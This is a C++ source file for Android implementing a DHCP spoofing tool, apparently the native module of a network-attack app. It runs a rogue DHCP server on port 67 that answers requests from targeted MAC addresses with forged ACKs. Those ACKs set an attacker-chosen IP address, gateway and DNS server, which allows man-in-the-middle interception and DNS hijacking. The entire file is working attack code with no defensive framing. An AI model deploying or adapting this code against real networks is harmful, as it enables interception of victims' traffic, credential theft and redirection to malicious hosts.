#include "dhcp_spoofing.h"
#include <android/log.h>
#include <cstring>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>

#define LOG_TAG "DHCPSpoofing"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// DHCP packet structures
struct dhcp_header {
    uint8_t op;           // Message type (1=request, 2=response)
    uint8_t htype;        // Hardware address type (1=Ethernet)
    uint8_t hlen;         // Hardware address length (6 for MAC)
    uint8_t hops;         // Client sets to 0
    uint32_t xid;         // Transaction ID
    uint16_t secs;        // Seconds elapsed
    uint16_t flags;       // Flags
    uint32_t ciaddr;      // Client IP address
    uint32_t yiaddr;      // Your IP address (assigned by server)
    uint32_t siaddr;      // Server IP address
    uint32_t giaddr;      // Gateway IP address
    uint8_t chaddr[16];   // Client hardware address
    uint8_t sname[64];    // Server hostname
    uint8_t file[128];    // Boot filename
    uint32_t magic_cookie; // DHCP magic cookie (0x63825363)
};

// Global variables for DHCP spoofing
static std::vector<DHCPSpoofRule> g_dhcp_rules;
static std::mutex g_dhcp_rules_mutex;
static std::atomic<bool> g_dhcp_spoof_active(false);
static std::thread *g_dhcp_spoof_thread = nullptr;
static int g_dhcp_socket = -1;
static std::atomic<bool> g_stop_dhcp_spoofing(false);

// Function to convert MAC address to string
std::string mac_to_string(const uint8_t *mac) {
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

// Function to convert string MAC to bytes (case-insensitive)
bool string_to_mac(const std::string& mac_str, uint8_t *mac) {
    int values[6];
    char sep[5];
    int n = sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x%c",
                   &values[0], &values[1], &values[2], 
                   &values[3], &values[4], &values[5], sep);
    
    if (n == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (uint8_t) values[i];
        }
        return true;
    }
    return false;
}

// Case-insensitive MAC comparison
bool mac_equals(const std::string& mac1, const std::string& mac2) {
    if(mac1.length() != mac2.length()) return false;
    for(size_t i = 0; i < mac1.length(); i++) {
        if(tolower(mac1[i]) != tolower(mac2[i])) return false;
    }
    return true;
}

// Function to craft a DHCP offer/ACK packet
int craft_dhcp_response(const struct dhcp_header *request, 
                       unsigned char *response_buffer, 
                       int buffer_size,
                       const DHCPSpoofRule& rule) {
    if(buffer_size < (int)(sizeof(struct dhcp_header) + 100)) {
        LOGE("Response buffer too small for DHCP packet");
        return -1;
    }
    
    // Copy the request header to response
    struct dhcp_header *response = (struct dhcp_header*)response_buffer;
    memcpy(response, request, sizeof(struct dhcp_header));
    
    // Set response fields
    response->op = 2;  // DHCP response
    response->yiaddr = inet_addr(rule.spoofed_ip.c_str());  // Assign spoofed IP
    response->siaddr = inet_addr(rule.gateway_ip.c_str());  // Server IP
    response->magic_cookie = htonl(0x63825363);  // DHCP magic cookie
    
    LOGD("Crafted DHCP response for MAC %s -> IP %s (gateway: %s, subnet: %s, dns: %s)", 
         mac_to_string(request->chaddr).c_str(), 
         rule.spoofed_ip.c_str(),
         rule.gateway_ip.c_str(),
         rule.subnet_mask.c_str(),
         rule.dns_server.c_str());
    
    // Add DHCP options
    unsigned char *options = response_buffer + sizeof(struct dhcp_header);
    int options_len = 0;
    
    // Option 53: DHCP Message Type (5 = ACK)
    options[options_len++] = 53;  // Option code
    options[options_len++] = 1;   // Length
    options[options_len++] = 5;   // ACK
    LOGD("Added DHCP message type: ACK");
    
    // Option 54: DHCP Server Identifier (use gateway IP as server)
    options[options_len++] = 54;  // Option code
    options[options_len++] = 4;   // Length
    uint32_t server_id = inet_addr(rule.gateway_ip.c_str());
    memcpy(&options[options_len], &server_id, 4);
    options_len += 4;
    LOGD("Added DHCP server ID: %s", rule.gateway_ip.c_str());
    
    // Option 1: Subnet Mask
    options[options_len++] = 1;  // Option code
    options[options_len++] = 4;  // Length
    uint32_t subnet = inet_addr(rule.subnet_mask.c_str());
    memcpy(&options[options_len], &subnet, 4);
    options_len += 4;
    LOGD("Added subnet mask option: %s", rule.subnet_mask.c_str());
    
    // Option 3: Router (Gateway)
    options[options_len++] = 3;  // Option code
    options[options_len++] = 4;  // Length
    uint32_t gateway = inet_addr(rule.gateway_ip.c_str());
    memcpy(&options[options_len], &gateway, 4);
    options_len += 4;
    LOGD("Added router option: %s", rule.gateway_ip.c_str());
    
    // Option 6: DNS Server
    options[options_len++] = 6;  // Option code
    options[options_len++] = 4;  // Length
    uint32_t dns = inet_addr(rule.dns_server.c_str());
    memcpy(&options[options_len], &dns, 4);
    options_len += 4;
    LOGD("Added DNS server option: %s", rule.dns_server.c_str());
    
    // Option 51: Lease Time (1 hour = 3600 seconds)
    options[options_len++] = 51;  // Option code
    options[options_len++] = 4;   // Length
    uint32_t lease_time = htonl(3600);
    memcpy(&options[options_len], &lease_time, 4);
    options_len += 4;
    LOGD("Added lease time option: 3600 seconds");
    
    // Option 255: End of options
    options[options_len++] = 255;
    
    int total_size = sizeof(struct dhcp_header) + options_len;
    LOGD("DHCP response packet size: %d bytes (header: %zu, options: %d)", 
         total_size, sizeof(struct dhcp_header), options_len);
    
    return total_size;
}

// Function to handle incoming DHCP packets
void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_in * /*client_addr*/) {
    if (packet_size < (int)sizeof(struct dhcp_header)) {
        LOGE("DHCP packet too small: %d bytes", packet_size);
        return;
    }
    
    struct dhcp_header *header = (struct dhcp_header*)packet;
    
    // Check if this is a DHCP discover/request message
    if (header->op != 1) {  // Not a request
        LOGD("Ignoring non-request DHCP packet (op=%d)", header->op);
        return;
    }
    
    // Check for DHCP magic cookie
    if (ntohl(header->magic_cookie) != 0x63825363) {
        LOGE("Invalid DHCP magic cookie: 0x%x", ntohl(header->magic_cookie));
        return;
    }
    
    std::string client_mac = mac_to_string(header->chaddr);
    LOGD("Received DHCP request from MAC: %s (xid: 0x%x)", client_mac.c_str(), ntohl(header->xid));
    
    // Check if this MAC matches any of our spoofing rules
    DHCPSpoofRule matched_rule;
    bool rule_found = false;
    
    {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        LOGD("Checking %zu DHCP rules for MAC %s", g_dhcp_rules.size(), client_mac.c_str());
        for(const auto& rule : g_dhcp_rules) {
            LOGD("  Rule: %s -> %s", rule.target_mac.c_str(), rule.spoofed_ip.c_str());
            if(mac_equals(rule.target_mac, client_mac)) {
                matched_rule = rule;
                rule_found = true;
                LOGD("  ✓ MATCHED!");
                break;
            }
        }
    }
    
    if(rule_found) {
        LOGD("DHCP spoofing rule matched for %s -> %s", 
             client_mac.c_str(), matched_rule.spoofed_ip.c_str());
        
        // Craft a DHCP response packet
        unsigned char response_buffer[1500];
        int response_size = craft_dhcp_response(header, response_buffer, sizeof(response_buffer), matched_rule);
        
        if(response_size <= 0) {
            LOGE("Failed to craft DHCP response");
            return;
        }
        
        // Send the spoofed response back to the client
        int dhcp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(dhcp_sock >= 0) {
            // Set socket options to allow binding to privileged port
            int opt = 1;
            setsockopt(dhcp_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            setsockopt(dhcp_sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
            
            struct sockaddr_in response_addr;
            memset(&response_addr, 0, sizeof(response_addr));
            response_addr.sin_family = AF_INET;
            response_addr.sin_port = htons(68);  // BOOTP client port
            response_addr.sin_addr.s_addr = INADDR_BROADCAST;  // Broadcast to all clients
            
            LOGD("Sending DHCP response to broadcast (port 68)...");
            ssize_t sent = sendto(dhcp_sock, response_buffer, response_size, 0, 
                                  (struct sockaddr*)&response_addr, sizeof(response_addr));
            
            if(sent > 0) {
                LOGD("✓ Sent spoofed DHCP response to %s (%d bytes, xid: 0x%x)", 
                     client_mac.c_str(), (int)sent, ntohl(header->xid));
            } else {
                LOGE("✗ Failed to send DHCP response: %s (errno: %d)", strerror(errno), errno);
            }
            
            close(dhcp_sock);
        } else {
            LOGE("Failed to create response socket: %s", strerror(errno));
        }
    } else {
        LOGD("No DHCP spoofing rule found for MAC: %s", client_mac.c_str());
    }
}

// Main DHCP spoofing thread function
void dhcp_spoof_thread_func(const std::string& interface) {
    LOGD("Starting DHCP spoofing on interface: %s", interface.c_str());
    
    // Create raw socket to capture DHCP packets (UDP port 67)
    g_dhcp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(g_dhcp_socket < 0) {
        LOGE("Failed to create DHCP spoofing socket: %s (errno: %d)", strerror(errno), errno);
        return;
    }
    LOGD("Created DHCP socket: fd=%d", g_dhcp_socket);
    
    // Allow port reuse and broadcast
    int opt = 1;
    if(setsockopt(g_dhcp_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        LOGE("Failed to set SO_REUSEADDR: %s", strerror(errno));
    }
    if(setsockopt(g_dhcp_socket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt)) < 0) {
        LOGE("Failed to set SO_BROADCAST: %s", strerror(errno));
    }
    
    // Bind to DHCP server port (67)
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(67);  // DHCP server port
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
    
    if(bind(g_dhcp_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        LOGE("Failed to bind DHCP socket to port 67: %s (errno: %d)", strerror(errno), errno);
        close(g_dhcp_socket);
        g_dhcp_socket = -1;
        return;
    }
    LOGD("✓ Bound to port 67 successfully");
    
    g_stop_dhcp_spoofing = false;
    
    // Buffer for incoming packets
    unsigned char packet_buffer[1500];  // Standard Ethernet frame size
    
    LOGD("DHCP spoofing listening on port 67...");
    
    int packet_count = 0;
    int no_packet_count = 0;
    
    // Set receive timeout to 5 seconds for periodic status logging
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    while(!g_stop_dhcp_spoofing) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        
        int packet_size = recvfrom(g_dhcp_socket, packet_buffer, sizeof(packet_buffer), 0,
                                   (struct sockaddr*)&client_addr, &addr_len);
        
        if(packet_size < 0) {
            if(errno == EINTR) continue;
            if(errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout - log status periodically
                no_packet_count++;
                if(no_packet_count % 1 == 0) {  // Every 5 seconds
                    LOGD("DHCP listening... (no packets in last 5s, total received: %d)", packet_count);
                }
                continue;
            }
            LOGE("Error receiving DHCP packet: %s (errno: %d)", strerror(errno), errno);
            break;
        }
        
        no_packet_count = 0;
        packet_count++;
        LOGD("✓ Received DHCP packet #%d from %s:%d (size: %d bytes)", 
             packet_count, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), packet_size);
        
        // Handle the DHCP packet
        handle_dhcp_packet(packet_buffer, packet_size, &client_addr);
    }
    
    close(g_dhcp_socket);
    g_dhcp_socket = -1;
    LOGD("DHCP spoofing thread stopped (processed %d packets total)", packet_count);
}

bool dhcp_spoof_init() {
    LOGD("Initializing DHCP spoofing operations");
    return true;
}

bool dhcp_start_spoofing(const char *interface, const std::vector<DHCPSpoofRule>& rules) {
    LOGD("Starting DHCP spoofing on interface: %s with %zu rules", interface, rules.size());
    
    if(g_dhcp_spoof_active.load()) {
        LOGE("DHCP spoofing is already active");
        return false;
    }
    
    // Apply the rules
    {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        g_dhcp_rules = rules;
        LOGD("Loaded %zu DHCP spoofing rules:", g_dhcp_rules.size());
        for(const auto& rule : g_dhcp_rules) {
            LOGD("  • %s -> %s (gw: %s, mask: %s, dns: %s)", 
                 rule.target_mac.c_str(), rule.spoofed_ip.c_str(),
                 rule.gateway_ip.c_str(), rule.subnet_mask.c_str(), rule.dns_server.c_str());
        }
    }
    
    // Start the spoofing thread
    try {
        g_dhcp_spoof_thread = new std::thread(dhcp_spoof_thread_func, std::string(interface));
        g_dhcp_spoof_active = true;
        LOGD("✓ DHCP spoofing started successfully");
        return true;
    } catch(const std::exception& e) {
        LOGE("✗ Failed to start DHCP spoofing thread: %s", e.what());
        return false;
    }
}

void dhcp_stop_spoofing() {
    LOGD("Stopping DHCP spoofing");
    
    if(!g_dhcp_spoof_active.load()) {
        LOGD("DHCP spoofing is not active");
        return;
    }
    
    g_stop_dhcp_spoofing = true;
    
    if(g_dhcp_socket >= 0) {
        LOGD("Closing DHCP socket: fd=%d", g_dhcp_socket);
        close(g_dhcp_socket);
        g_dhcp_socket = -1;
    }
    
    if(g_dhcp_spoof_thread && g_dhcp_spoof_thread->joinable()) {
        LOGD("Waiting for DHCP spoofing thread to join...");
        g_dhcp_spoof_thread->join();
        delete g_dhcp_spoof_thread;
        g_dhcp_spoof_thread = nullptr;
        LOGD("DHCP spoofing thread joined");
    }
    
    g_dhcp_spoof_active = false;
    LOGD("✓ DHCP spoofing stopped");
}

void dhcp_add_rule(const char *target_mac, const char *spoofed_ip, 
                  const char *gateway_ip, const char *subnet_mask, 
                  const char *dns_server) {
    if(target_mac && spoofed_ip && gateway_ip && subnet_mask && dns_server) {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        // Check if rule already exists
        for(auto& rule : g_dhcp_rules) {
            if(rule.target_mac == target_mac) {
                LOGD("Updating DHCP rule for %s: %s -> %s (gw: %s, mask: %s, dns: %s)", 
                     target_mac, rule.spoofed_ip.c_str(), spoofed_ip, gateway_ip, subnet_mask, dns_server);
                rule.spoofed_ip = spoofed_ip;
                rule.gateway_ip = gateway_ip;
                rule.subnet_mask = subnet_mask;
                rule.dns_server = dns_server;
                return;
            }
        }
        // Add new rule
        g_dhcp_rules.push_back({
            target_mac, spoofed_ip, gateway_ip, subnet_mask, dns_server
        });
        LOGD("✓ Added DHCP rule: %s -> %s (gw: %s, mask: %s, dns: %s)", 
             target_mac, spoofed_ip, gateway_ip, subnet_mask, dns_server);
    } else {
        LOGE("Invalid DHCP rule parameters (null values)");
    }
}

void dhcp_remove_rule(const char *target_mac) {
    if(target_mac) {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        size_t before = g_dhcp_rules.size();
        g_dhcp_rules.erase(
            std::remove_if(g_dhcp_rules.begin(), g_dhcp_rules.end(),
                          [target_mac](const DHCPSpoofRule& rule) {
                              return rule.target_mac == target_mac;
                          }),
            g_dhcp_rules.end()
        );
        if(g_dhcp_rules.size() < before) {
            LOGD("✓ Removed DHCP rule for %s (%zu rules remaining)", target_mac, g_dhcp_rules.size());
        } else {
            LOGD("No DHCP rule found for %s", target_mac);
        }
    }
}

void dhcp_clear_rules() {
    std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
    size_t count = g_dhcp_rules.size();
    g_dhcp_rules.clear();
    LOGD("Cleared %zu DHCP spoofing rules", count);
}

bool dhcp_is_active() {
    return g_dhcp_spoof_active.load();
}

void dhcp_spoof_cleanup() {
    LOGD("Cleaning up DHCP spoofing operations");
    dhcp_stop_spoofing();
    dhcp_clear_rules();
}